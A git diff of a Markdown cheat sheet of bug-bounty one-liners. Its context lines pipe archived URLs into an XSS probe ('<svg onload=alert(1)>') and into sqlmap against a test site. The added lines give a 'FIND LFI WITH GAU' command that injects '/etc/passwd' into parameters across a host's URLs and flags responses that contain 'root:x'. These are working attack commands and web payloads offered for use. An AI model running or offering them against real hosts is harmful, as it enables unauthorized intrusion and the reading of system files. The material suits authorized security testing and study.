@@ -54,3 +54,7 @@ echo "exemplo.com" | waybackurls | gf xss | qsreplace "<svg onload=alert(1)>" | 
 ```bash
 waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
 ```
+###  FIND LFI WITH GAU
+```
+gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
